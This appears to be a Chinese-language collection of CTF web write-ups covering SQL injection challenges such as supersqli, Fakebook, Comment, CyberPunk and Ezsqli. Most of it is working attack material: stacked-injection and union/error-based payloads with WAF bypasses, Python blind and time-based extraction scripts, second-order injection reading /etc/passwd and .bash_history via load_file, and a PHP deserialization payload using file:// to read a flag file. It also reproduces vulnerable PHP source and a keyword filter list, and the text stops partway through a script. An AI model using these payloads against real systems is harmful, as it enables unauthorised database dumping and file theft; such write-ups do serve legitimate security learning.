题目环境用的数据库和flag所在的数据库一样，都是supersqli，只不过两个表不同，因此我们可以改下表的名字，先看下表的结构 121&#x27;;use supersqli;show tables;show columns from `1919810931114514`;#1&#x27;;use supersqli;show tables;show columns from words;# 发现数字表只有flag这一列，而题目所使用的表有id,data两列，因此我们可以往数字表里插入一个名为id的列，然后将flag列重新命名为data，再将数字表名改为words，把words表改成其它名称，payload: 11&#x27;;RENAME TABLE `words` TO `test666`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` ADD COLUMN id INT(11);# 注意数字表要加反引号，id因为是刚插入的，应该为空，所以需要加个or 1=1# [SUCTF 2019]EasySQLwriteup同样是堆叠注入，按照以前的思路发现能注出数据库为ctf，表为Flag，字段就没办法了 不绕弯子，后台sql语句： 1select $_POST[&#x27;query&#x27;]||flag from Flag 解题payload: 11;set sql_mode&#x3D;PIPES_AS_CONCAT;select 1 相当于执行： 1select 1;set sql_mode=PIPES_AS_CONCAT;select 1||flag from Flag sql_modesql_mode：是一组mysql支持的基本语法及校验规则，PIPES_AS_CONCAT：将“||”视为字符串的连接操作符而非或运算符，这和Oracle数据库是一样的，也和字符串的拼接函数Concat相类似 还有个payload: 1*,1 相当于执行: 1select *,1||flag from Flag [CISCN2019 华北赛区 Day2 Web1]Hack Worldwriteup打开题目提示flag在flag表flag字段里，bool盲注，exp: 12345678910111213141516171819202122232425262728import requestsurl=&quot;http://fea4ab1f-7bf4-452f-9c2a-83dadf6f6315.node3.buuoj.cn&quot;flag=&#x27;&#x27;for i in range(1,50): f1=flag top=127 low=33 while low&lt;=top: mid=(top+low)//2 data=&#123;&#x27;id&#x27;:&#x27;if(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)&#x27;.format(str(i),str(mid))&#125; data1=&#123;&#x27;id&#x27;:&#x27;if(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))=&#123;&#125;,1,0)&#x27;.format(str(i),str(mid))&#125; try: r1=requests.post(url,data=data1) print(i,mid) if &#x27;glzjin&#x27; in r1.text: flag+=chr(mid) print(flag) break r=requests.post(url,data=data) if &quot;Error&quot; in r.text: top=mid-1 if &#x27;glzjin&#x27; in r.text: low=mid+1 except Exception as e: pass if flag==f1: break 还有种payload： 1id&#x3D;1^(if(ascii(substr((select(flag)from(flag)),1,1))&#x3D;100,1,0)) [网鼎杯 2018]Fakebookwriteup扫目录，发现flag.php和robots.txt，访问看到user.php.bak，得到 123456789101112131415161718192021222324252627282930313233343536&lt;?phpclass UserInfo&#123; public $name = &quot;&quot;; public $age = 0; public $blog = &quot;&quot;; public function __construct($name, $age, $blog) &#123; $this-&gt;name = $name; $this-&gt;age = (int)$age; $this-&gt;blog = $blog; &#125; function get($url) &#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output = curl_exec($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); if($httpCode == 404) &#123; return 404; &#125; curl_close($ch); return $output; &#125; public function getBlogContents () &#123; return $this-&gt;get($this-&gt;blog); &#125; public function isValidBlog () &#123; $blog = $this-&gt;blog; return preg_match(&quot;/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\/\\S*)?$/i&quot;, $blog); &#125;&#125; 随便注册个账号进去，在view.php?no=发现存在注入 order by 判断出有四列，试了试联合查询，发现直接union select被waf拦了 尝试 union/**/select发现可以成功绕过，判断回显位，发现是第二位 接着就是爆数据库，表，列 1234567view.php?no=-1 union/**/select 1,group_concat(schema_name),3,4 from information_schema.schemata%23# 得到fakebook,information_schema,mysql,performance_schema,testview.php?no=-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()%23# 得到usersview.php?no=-1 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=database()%23# 得到no,username,passwd,data view.php?no=-1 union/**/select 1,concat(no,&#x27; &#x27;,username,&#x27; &#x27;,passwd,&#x27; &#x27;,data),3,4 from fakebook.users where no=1%23 发现用16进制分割的时候会被waf拦，直接用空格字符串 发现最后一列的值是序列化的结果，应该和前面的源码泄露有关 注入这里也可以用报错注入 1234567view.php?no=-1 and extractvalue(1,concat(1,database()))%23view.php?no=-1 and extractvalue(1,concat(1,(select group_concat(table_name) from information_schema.tables where table_schema=database())))%23view.php?no=-1 and extractvalue(1,concat(1,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;)))%23view.php?no=-1 and extractvalue(1,concat(1,(select group_concat(data) from fakebook.users where no=1)))%23 在爆内容的时候发现不全，这是因为报错注入长度限制，默认为32个字符，我们先用length爆一下长度，再用left,right,reverse来看到全部内容 看其他大佬的操作，还可以用make_set函数，之前没用过，这里记一下 12view.php?no=1 and updatexml(1,make_set(3,&#x27;~&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)## 回显前两列 详细可以看：https://blog.csdn.net/qq_41725312/article/details/83039525 题目可以直接load_file读文件 1view.php?no=-1 union/**/select 1,load_file(&#x27;/var/www/html/index.php&#x27;),3,4%23 直接读flag.php可以得到flag 读index.php发现存在反序列化 123456789101112&lt;?phpforeach ($db-&gt;getAllUsers() as $user)&#123;$data = unserialize($user[&#x27;data&#x27;]);echo &quot;&lt;tr&gt;&quot;;echo &quot;&lt;td&gt;&#123;$user[&#x27;no&#x27;]&#125;&lt;/td&gt;&quot;;echo &quot;&lt;td&gt;&lt;a href=&#x27;view.php?no=&#123;$user[&#x27;no&#x27;]&#125;&#x27;&gt;&#123;$user[&#x27;username&#x27;]&#125;&lt;/a&gt;&lt;/td&gt;&quot;;echo &quot;&lt;td&gt;&#123;$data-&gt;age&#125;&lt;/td&gt;&quot;;echo &quot;&lt;td&gt;&#123;$data-&gt;blog&#125;&lt;/td&gt;&quot;;echo &quot;&lt;/tr&gt;\\n&quot;;&#125;?&gt; 接着我们又在view.php发现存在和上面一样的反序列化，并调用了user类里的getBlogContents方法： 12345678910111213141516171819202122232425&lt;?php$no = $_GET[&#x27;no&#x27;];if ($db-&gt;anti_sqli($no))&#123; die(&quot;no hack ~_~&quot;);&#125;$res = $db-&gt;getUserByNo($no);$user = unserialize($res[&#x27;data&#x27;]);//print_r($res);?&gt; &lt;?php$response = $user-&gt;getBlogContents();if ($response === 404)&#123;echo &quot;404 Not found&quot;;&#125;else&#123;$base64 = base64_encode($response);echo &quot;&lt;iframe width=&#x27;100%&#x27; height=&#x27;10em&#x27; src=&#x27;data:text/html;base64,&#123;$base64&#125;&#x27;&gt;&quot;;// echo $response;&#125;// var_dump($user-&gt;getBlogContents());?&gt; 捋下思路，index.php会获取所有用户，并把数据库中data字段反序列化，view.php会访问之前留的blog链接的内容，而在index.php那里存在正则过滤，我们无法在blog插入file://协议读源码的代码，但在view.php并不存在过滤，并且此处存在sql注入，所以我们可以直接union一个假的用户,data在第四个字段上 exp: 12345678&lt;?phpclass UserInfo&#123; public $name = &quot;&quot;; public $age = 0; public $blog = &quot;file:///var/www/html/flag.php&quot;;&#125;echo serialize(new UserInfo()); 请求带上，注意序列化字符串要加上引号 1view.php?no=-1 union/**/select 1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:0:&quot;&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;%23 查看源代码，点data协议就行 [网鼎杯 2018]Commentwriteup扫目录，发现git源码泄露，git_extract恢复，得到write_do.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;?phpinclude &quot;mysql.php&quot;;session_start();if($_SESSION[&#x27;login&#x27;] != &#x27;yes&#x27;)&#123; header(&quot;Location: ./login.php&quot;); die();&#125;if(isset($_GET[&#x27;do&#x27;]))&#123;switch ($_GET[&#x27;do&#x27;])&#123;case &#x27;write&#x27;: $category = addslashes($_POST[&#x27;category&#x27;]); $title = addslashes($_POST[&#x27;title&#x27;]); $content = addslashes($_POST[&#x27;content&#x27;]); $sql = &quot;insert into board set category = &#x27;$category&#x27;, title = &#x27;$title&#x27;, content = &#x27;$content&#x27;&quot;; $result = mysql_query($sql); header(&quot;Location: ./index.php&quot;); break;case &#x27;comment&#x27;: $bo_id = addslashes($_POST[&#x27;bo_id&#x27;]); $sql = &quot;select category from board where id=&#x27;$bo_id&#x27;&quot;; $result = mysql_query($sql); $num = mysql_num_rows($result); if($num&gt;0)&#123; $category = mysql_fetch_array($result)[&#x27;category&#x27;]; $content = addslashes($_POST[&#x27;content&#x27;]); $sql = &quot;insert into comment set category = &#x27;$category&#x27;, content = &#x27;$content&#x27;, bo_id = &#x27;$bo_id&#x27;&quot;; $result = mysql_query($sql); &#125; header(&quot;Location: ./comment.php?id=$bo_id&quot;); break;default: header(&quot;Location: ./index.php&quot;);&#125;&#125;else&#123; header(&quot;Location: ./index.php&quot;);&#125;?&gt; login.php爆破弱口令，密码为zhangwei666 addslashes()函数： 题目考察的是二次注入，即先向数据库插入闭合语句，然后再在查询时取出来，达到绕过addslashes()函数的作用 从上面的代码可以看到write那块是插入帖子信息到数据库，而comment那块是把评论并存到数据库里，并且这块根据id值取出了帖子category参数的内容，并插入数据库，所以，现在思路很明确，先发一个帖子，在category里写入&#39;闭合 此时执行的sql语句 1234insert into board set category = &#x27;\\&#x27;,content=database(),/*&#x27;, title = &#x27;aaaaaaa&#x27;, content = &#x27;adsd&#x27; 由于转义，插入到数据库的内容category字段值为&#39;,content=database(),/* 接着我们再 此时执行插入操作的sql语句 1234insert into comment set category = &#x27;&#x27;,content=database(),/*&#x27;, content = &#x27;*/#&#x27;, bo_id = &#x27;9&#x27; 就成功把database()作为content字段的内容插入 按照这种思路load_file读取文件/etc/passwd 1&#x27;,content=(select(load_file(&quot;/etc/passwd&quot;))),/* 看到/home/www以bash运行，读一下/home/www/.bash_history 1&#x27;,content=(select(load_file(&quot;/home/www/.bash_history&quot;))),/* 看命令可以猜测再/tmp/html/.DS_Store文件，直接读会读不全，用hex编码 1&#x27;,content=(select hex(load_file(&quot;/tmp/html/.DS_Store&quot;))),/* 访问一下，确实有，读一下flag_8946e1ff1ee3e40f.php文件 1&#x27;,content=(select load_file(&quot;/var/www/html/flag_8946e1ff1ee3e40f.php&quot;)),/* 得到flag [网鼎杯2018]Unfinishwriteup打开跳转到login.php，不知道为啥扫目录扫不到register.php,可能是buu环境的问题吧 先在login.php试了很久没有啥收获，先注册一个账号吧，登陆发现除了用户名啥都没有，fuzz一下，发现username处有注入 fuzz一下发现过滤了,和information，由于逗号过滤 123if(1,1,0) &lt;==&gt; case when 1 then 1 else 0 endsubstr(database(),1,1) &lt;==&gt; substr(database() from 1 for 1)limt 9,4 &lt;==&gt; limit 9 offset 4 测试上面payload可用，就可以写脚本了，exp: 1234567891011121314151617181920212223242526272829303132333435363738import requestsurl=&quot;http://e2237b8f-0ea4-4294-bbe7-007af8f88f8b.node3.buuoj.cn/register.php&quot;flag=&#x27;&#x27;proxies=&#123; &quot;http&quot;:&quot;127.0.0.1:8080&quot;&#125;for i in range(1,50): f1=flag top=127 low=33 while low&lt;=top: mid=(top+low)//2 p1=&quot;aaaaa&#x27; || (case when ascii(substr((select*from flag) from &#123;&#125; for 1))&gt;&#123;&#125; then sleep(3) else 0 end) || &#x27;aaa&quot;.format(i,mid) p2=&quot;aaaaa&#x27; || (case when ascii(substr((select*from flag) from &#123;&#125; for 1))=&#123;&#125; then sleep(3) else 0 end) || &#x27;aaa&quot;.format(i,mid) data1=&#123;&#x27;email&#x27;:&#x27;basb@qq.com&#x27;,&#x27;username&#x27;:p1,&#x27;password&#x27;:&#x27;1234&#x27;&#125; data2=&#123;&#x27;email&#x27;:&#x27;basb@qq.com&#x27;,&#x27;username&#x27;:p2,&#x27;password&#x27;:&#x27;1234&#x27;&#125; try: print(i,mid) r1=requests.post(url,data=data2,timeout=3,proxies=proxies) except requests.exceptions.ReadTimeout as e: flag+=chr(mid) print(flag) break except Exception as e: pass else: try: r2=requests.post(url,data=data1,timeout=3,proxies=proxies) except requests.exceptions.ReadTimeout as e: low=mid+1 except Exception as e: pass else: top=mid-1 if flag==f1: break [SWPU2019]Web1writeup广告处二次注入,过滤了空格，先判断列数，一个一个试发现有22列，判断回显位发现： 1test&#x27;/**/UNION/**/SELECT/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27; 回显位为2,3位 1test1&#x27;/**/UNION/**/SELECT/**/1,database(),(select/**/concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27; 直接用发现会被拦，过滤了information_schema，bypass参考: https://www.anquanke.com/post/id/193512 可以无列名注入绕过，先猜一下表名： 1test2&#x27;/**/UNION/**/SELECT/**/1,2,(select/**/count(*)/**/from/**/users),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27; 三条，说明存在该表 1test3&#x27;/**/UNION/**/SELECT/**/1,2,(select/**/group_concat(a)/**/from/**/(select/**/1,2/**/as/**/a,3/**/as/**/b/**/from/**/users/**/union/**/select*from/**/users)c),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27; 注flag内容 1test4&#x27;/**/UNION/**/SELECT/**/1,2,(select/**/group_concat(b)/**/from/**/(select/**/1,2/**/as/**/a,3/**/as/**/b/**/from/**/users/**/union/**/select*from/**/users)c),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27; [CISCN2019 华北赛区 Day1 Web5]CyberPunkwriteup查看源代码 发现 1&lt;!--?file&#x3D;?--&gt; 伪协议读源码 index.php 1234567891011121314&lt;?phpini_set(&#x27;open_basedir&#x27;, &#x27;/var/www/html/&#x27;);// $file = $_GET[&quot;file&quot;];$file = (isset($_GET[&#x27;file&#x27;]) ? $_GET[&#x27;file&#x27;] : null);if (isset($file))&#123; if (preg_match(&quot;/phar|zip|bzip2|zlib|data|input|%00/i&quot;,$file)) &#123; echo(&#x27;no way!&#x27;); exit; &#125; @include($file);&#125;?&gt; 这应该没办法绕了 confirm.php 12345678910111213141516171819202122232425262728293031323334353637&lt;?phprequire_once &quot;config.php&quot;;//var_dump($_POST);if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))&#123; $msg = &#x27;&#x27;; $pattern = &#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;; $user_name = $_POST[&quot;user_name&quot;]; $address = $_POST[&quot;address&quot;]; $phone = $_POST[&quot;phone&quot;]; if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; $msg = &#x27;no sql inject!&#x27;; &#125;else&#123; $sql = &quot;select * from `user` where `user_name`=&#x27;&#123;$user_name&#125;&#x27; and `phone`=&#x27;&#123;$phone&#125;&#x27;&quot;; $fetch = $db-&gt;query($sql); &#125; if($fetch-&gt;num_rows&gt;0) &#123; $msg = $user_name.&quot;已提交订单&quot;; &#125;else&#123; $sql = &quot;insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)&quot;; $re = $db-&gt;prepare($sql); $re-&gt;bind_param(&quot;sss&quot;, $user_name, $address, $phone); $re = $re-&gt;execute(); if(!$re) &#123; echo &#x27;error&#x27;; print_r($db-&gt;error); exit; &#125; $msg = &quot;订单提交成功&quot;; &#125;&#125; else &#123; $msg = &quot;信息不全&quot;;&#125;?&gt; config.php 12345678910111213&lt;?phpini_set(&quot;open_basedir&quot;, getcwd() . &quot;:/etc:/tmp&quot;);$DATABASE = array( &quot;host&quot; =&gt; &quot;127.0.0.1&quot;, &quot;username&quot; =&gt; &quot;root&quot;, &quot;password&quot; =&gt; &quot;root&quot;, &quot;dbname&quot; =&gt;&quot;ctfusers&quot;);$db = new mysqli($DATABASE[&#x27;host&#x27;],$DATABASE[&#x27;username&#x27;],$DATABASE[&#x27;password&#x27;],$DATABASE[&#x27;dbname&#x27;]); search.php 1234567891011121314151617181920212223242526272829303132&lt;?phprequire_once &quot;config.php&quot;; if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))&#123; $msg = &#x27;&#x27;; $pattern = &#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;; $user_name = $_POST[&quot;user_name&quot;]; $phone = $_POST[&quot;phone&quot;]; if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; $msg = &#x27;no sql inject!&#x27;; &#125;else&#123; $sql = &quot;select * from `user` where `user_name`=&#x27;&#123;$user_name&#125;&#x27; and `phone`=&#x27;&#123;$phone&#125;&#x27;&quot;; $fetch = $db-&gt;query($sql); &#125; if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123; $row = $fetch-&gt;fetch_assoc(); if(!$row) &#123; echo &#x27;error&#x27;; print_r($db-&gt;error); exit; &#125; $msg = &quot;&lt;p&gt;姓名:&quot;.$row[&#x27;user_name&#x27;].&quot;&lt;/p&gt;&lt;p&gt;, 电话:&quot;.$row[&#x27;phone&#x27;].&quot;&lt;/p&gt;&lt;p&gt;, 地址:&quot;.$row[&#x27;address&#x27;].&quot;&lt;/p&gt;&quot;; &#125; else &#123; $msg = &quot;未找到订单!&quot;; &#125;&#125;else &#123; $msg = &quot;信息不全&quot;;&#125;?&gt; delete.php 123456789101112131415161718192021222324252627282930313233&lt;?phprequire_once &quot;config.php&quot;;if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))&#123; $msg = &#x27;&#x27;; $pattern = &#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;; $user_name = $_POST[&quot;user_name&quot;]; $phone = $_POST[&quot;phone&quot;]; if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; $msg = &#x27;no sql inject!&#x27;; &#125;else&#123; $sql = &quot;select * from `user` where `user_name`=&#x27;&#123;$user_name&#125;&#x27; and `phone`=&#x27;&#123;$phone&#125;&#x27;&quot;; $fetch = $db-&gt;query($sql); &#125; if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123; $row = $fetch-&gt;fetch_assoc(); $result = $db-&gt;query(&#x27;delete from `user` where `user_id`=&#x27; . $row[&quot;user_id&quot;]); if(!$result) &#123; echo &#x27;error&#x27;; print_r($db-&gt;error); exit; &#125; $msg = &quot;订单删除成功&quot;; &#125; else &#123; $msg = &quot;未找到订单!&quot;; &#125;&#125;else &#123; $msg = &quot;信息不全&quot;;&#125;?&gt; change.php 1234567891011121314151617181920212223242526272829303132333435&lt;?phprequire_once &quot;config.php&quot;;if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))&#123; $msg = &#x27;&#x27;; $pattern = &#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;; $user_name = $_POST[&quot;user_name&quot;]; $address = addslashes($_POST[&quot;address&quot;]); $phone = $_POST[&quot;phone&quot;]; if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; $msg = &#x27;no sql inject!&#x27;; &#125;else&#123; $sql = &quot;select * from `user` where `user_name`=&#x27;&#123;$user_name&#125;&#x27; and `phone`=&#x27;&#123;$phone&#125;&#x27;&quot;; $fetch = $db-&gt;query($sql); &#125; if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123; $row = $fetch-&gt;fetch_assoc(); $sql = &quot;update `user` set `address`=&#x27;&quot;.$address.&quot;&#x27;, `old_address`=&#x27;&quot;.$row[&#x27;address&#x27;].&quot;&#x27; where `user_id`=&quot;.$row[&#x27;user_id&#x27;]; $result = $db-&gt;query($sql); if(!$result) &#123; echo &#x27;error&#x27;; print_r($db-&gt;error); exit; &#125; $msg = &quot;订单修改成功&quot;; &#125; else &#123; $msg = &quot;未找到订单!&quot;; &#125;&#125;else &#123; $msg = &quot;信息不全&quot;;&#125;?&gt; 主要看下confirm.php和change.php 在插入时address参数没有经过那个正则匹配过滤 而且正则没有过滤单引号 并且注意到都有 1print_r($db-&gt;error); 明显二次注入 + 报错注入 在change.php直接查询出来的保存到旧地址里了 1$sql = &quot;update `user` set `address`=&#x27;&quot;.$address.&quot;&#x27;, `old_address`=&#x27;&quot;.$row[&#x27;address&#x27;].&quot;&#x27; where `user_id`=&quot;.$row[&#x27;user_id&#x27;]; 因此 尝试构造payload: 先提交订单 1user_name&#x3D;MB&amp;phone&#x3D;123456&amp;address&#x3D;123&#39; and updatexml(1,concat(0x3a,(select user())),1)# 再修改收获地址 注了下数据库 没找到flag 试了下能读文件 读取/flag.txt payload: 1user_name&#x3D;MB9&amp;phone&#x3D;123456&amp;address&#x3D;123&#39; and updatexml(1,concat(0x0a,substr(load_file(&#39;&#x2F;flag.txt&#39;),1,32)),1)# 使用substr截取读取另外一部分 [RCTF2015]EasySQLwriteup简单fuzz一下发现登陆处username有过滤 随便注册一个用户发现有修改密码功能 二次注入 注册aa\\用户 修改密码的时候根据报错可以知道是双引号闭合 后台sql语句 1update users set pwd=&#x27;$newpass&#x27; where name=&quot;$username&quot; and pwd=&#x27;$oldpass&#x27; 直接注册的时候双引号闭合就行 构造payload: 1aa&quot;||updatexml(1,concat(0x7e,user()),1)# 查表 1aa&quot;||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database()))),1)# 查字段 1aa&quot;||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_schema&#x3D;database())&amp;&amp;(table_name&#x3D;0x666c6167))),1)# 查内容 1aa&quot;||updatexml(1,concat(0x7e,(select(flag)from(flag))),1)# flag不在flag表里 看线users表的字段 1aa&quot;||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_schema&#x3D;database())&amp;&amp;(table_name&#x3D;0x7573657273))),1)# 显示不全 尝试截取substr、mid、left、right都过滤了 加上条件 like也过滤了 这里使用regexp 1aa&quot;||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_schema&#x3D;database())&amp;&amp;(table_name&#x3D;0x7573657273)&amp;&amp;((column_name)regexp(&#39;^r&#39;)))),1)# 尝试读取内容 1aa&quot;||updatexml(1,concat(0x7e,(select(real_flag_1s_here)from(users)where((real_flag_1s_here)regexp(&#39;^flag&#39;)))),1)# 只有一部分 剩下的可以使用逆序 1aa&quot;||updatexml(1,concat(0x7e,(select(reverse(real_flag_1s_here))from(users)where((real_flag_1s_here)regexp(&#39;^flag&#39;)))),1)# [GYCTF2020]Ezsqliwriteup数字型注入 fuzz一下 发现for、in 都过滤了 使用sys库的一些表绕过 1234567891011121314151617181920212223242526272829import requestsurl = &quot;http://742e643e-951f-4604-ac61-97b9149fe0c4.node3.buuoj.cn&quot;flag = &#x27;&#x27;for i in range(1,50): f1 = flag top = 127 low = 1 while low &lt;= top: mid=(top+low)//2 data1=&#123;&#x27;id&#x27;:&#x27;if(ascii(substr((SELECT group_concat(table_name) FROM sys.schema_table_statistics WHERE TABLE_SCHEMA = DATABASE()),&#123;&#125;,1))=&#123;&#125;,1,2)&#x27;.format(str(i),str(mid))&#125; data2=&#123;&#x27;id&#x27;:&#x27;if(ascii(substr((SELECT group_concat(table_name) FROM sys.schema_table_statistics WHERE TABLE_SCHEMA = DATABASE()),&#123;&#125;,1))&gt;&#123;&#125;,1,2)&#x27;.format(str(i),str(mid))&#125; try: r1 = requests.post(url,data=data1) print(i,mid) if &#x27;Nu1L&#x27; in r1.text: flag += chr(mid) print(flag) break r2 = requests.post(url,data=data2) if &quot;Nu1L&quot; in r2.text: low = mid+1 else: top = mid-1 except Exception as e: pass if flag == f1: break# users233333333333333,f1ag_1s_h3r3_hhhhh 无法得到列名 只能无列名注入了 原理： 1234567891011121314151617181920212223242526272829import requestsimport timedef str_to_hex(ss): s_hex=&#x27;&#x27; for i in range(len(ss)): s_hex=s_hex+hex(ord(ss[i]))[2:] return &quot;0x&quot; + s_hexurl = &quot;http://742e643e-951f-4604-ac61-97b9149fe0c4.node3.buuoj.cn&quot;flag = &#x27;&#x27;for i in range(1,50): f = flag for j in range(1,127): tmp_flag = flag+chr(j) data = &#123;&#x27;id&#x27;:&#x27;0||((select 1,&#123;&#125;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#x27;.format(str_to_hex(tmp_flag))&#125; print(i,j) try: time.sleep(0.2) r = requests.post(url,data=data) if &#x27;Nu1L&#x27; in r.text: flag += chr(j-1) print(flag) break except Exception as e: pass if f==flag: breakprint(flag.lower()) [NCTF2019]SQLiwriteup给出sql语句了 1select * from users where username=&#x27;&#x27; and passwd=&#x27;&#x27; 单引号过滤了 使用反斜杠 # -都过滤了这里使用 1username&#x3D;qaq\\&amp;passwd&#x3D;&#x2F;**&#x2F;||username&#x2F;**&#x2F;regexp&#x2F;**&#x2F;0x61646d696e;%00 以为登进去就有flag 后来发现还有robots.txt 里面有hint.txt 内容为 123456$black_list = &quot;/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\\&#x27;|=| |in|&lt;|&gt;|-|\\.|\\(\\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i&quot;;If $_POST[&#x27;passwd&#x27;] === admin&#x27;s password,Then you will get the flag; 写脚本注吧： 12345678910111213141516171819202122232425import requestsimport timeimport stringurl = &quot;http://2262e6be-566d-403b-8cfd-b89abfc23e44.node3.buuoj.cn&quot;flag = &#x27;&#x27;ss = string.ascii_lowercase + string.ascii_uppercase + string.digits + &quot;_&quot;for i in range(1,50): f = flag for j in ss: tmp_flag = flag+j data = &#123;&quot;username&quot;:&quot;qaq\\\\&quot;,&#x27;passwd&#x27;:&#x27;/**/||/**/passwd/**/regexp/**/&quot;^&#123;&#125;&quot;;&#123;&#125;&#x27;.format(tmp_flag,chr(0))&#125; print(i,j) try: time.sleep(0.05) r = requests.post(url,data=data) if &#x27;welcome.php&#x27; in r.text: flag += j print(flag) break except Exception as e: pass if f==flag: breakprint(flag.lower()) 成功会302跳转 requests库会跟随跳转 到404页面 [RoarCTF 2019]Online Proxywriteup 直接请求发现 XFF伪造ip 并且有上次的ip 这里有有可能是二次注入 很懵 大概就是带着注入payload请求一次 正常请求两次 带上cookie就可以bool盲注 这个题目还贼几把慢 离谱 exp: 12345678910111213141516171819202122232425262728293031323334353637383940import requestsurl=&quot;http://node3.buuoj.cn:25225/&quot;flag=&#x27;&#x27;for i in range(1,500): f1=flag top=127 low=33 while low&lt;=top: mid=(top+low)//2 p1 = &quot;0&#x27; || ascii(substr((select group_concat(F4l9_C01uMn) FROM F4l9_D4t4B45e.F4l9_t4b1e),&#123;&#125;,1))=&#123;&#125; || &#x27;0&quot;.format(str(i),str(mid)) p2 = &quot;0&#x27; || ascii(substr((select group_concat(F4l9_C01uMn) FROM F4l9_D4t4B45e.F4l9_t4b1e),&#123;&#125;,1))&gt;&#123;&#125; || &#x27;0&quot;.format(str(i),str(mid)) p3 = &#x27;127.0.0.1&#x27; headers1 = &#123;&#x27;X-Forwarded-For&#x27;:p1&#125; headers2 = &#123;&#x27;X-Forwarded-For&#x27;:p2&#125; headers3 = &#123;&#x27;X-Forwarded-For&#x27;:p3&#125; try: print(i,mid) r1 = requests.session() r1.get(url,headers=headers1) r1.get(url,headers=headers3) rr1 = r1.get(url,headers=headers3) if &quot;Last Ip: 1&quot; in rr1.text: flag+=chr(mid) print(flag) break else: r2 = requests.session() r2.get(url,headers=headers2) r2.get(url,headers=headers3) rr2 = r2.get(url,headers=headers3) if &quot;Last Ip: 1&quot; in rr2.text: low=mid+1 else: top=mid-1 except Exception as e: print(e) if flag==f1: breakprint(flag) 看别人的exp 这里直接进行运算了: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#!/usr/bin/env python3import requeststarget = &quot;http://node3.buuoj.cn:25225/&quot;def execute_sql(sql): print(&quot;[*]请求语句：&quot; + sql) return_result = &quot;&quot; payload = &quot;0&#x27;|length((&quot; + sql + &quot;))|&#x27;0&quot; session = requests.session() r = session.get(target, headers=&#123;&#x27;X-Forwarded-For&#x27;: payload&#125;) r = session.get(target, headers=&#123;&#x27;X-Forwarded-For&#x27;: &#x27;glzjin&#x27;&#125;) r = session.get(target, headers=&#123;&#x27;X-Forwarded-For&#x27;: &#x27;glzjin&#x27;&#125;) start_pos = r.text.find(&quot;Last Ip: &quot;) end_pos = r.text.find(&quot; --&gt;&quot;, start_pos) length = int(r.text[start_pos + 9: end_pos]) print(&quot;[+]长度：&quot; + str(length)) for i in range(1, length + 1, 5): payload = &quot;0&#x27;|conv(hex(substr((&quot; + sql + &quot;),&quot; + str(i) + &quot;,5)),16,10)|&#x27;0&quot; r = session.get(target, headers=&#123;&#x27;X-Forwarded-For&#x27;: payload&#125;) r = session.get(target, headers=&#123;&#x27;X-Forwarded-For&#x27;: &#x27;glzjin&#x27;&#125;) r = session.get(target, headers=&#123;&#x27;X-Forwarded-For&#x27;: &#x27;glzjin&#x27;&#125;) start_pos = r.text.find(&quot;Last Ip: &quot;) end_pos = r.text.find(&quot; --&gt;&quot;, start_pos) result = int(r.text[start_pos + 9: end_pos]) return_result += bytes.fromhex(hex(result)[2:]).decode(&#x27;utf-8&#x27;) print(&quot;[+]位置 &quot; + str(i) + &quot; 请求五位成功:&quot; + bytes.fromhex(hex(result)[2:]).decode(&#x27;utf-8&#x27;)) return return_result# 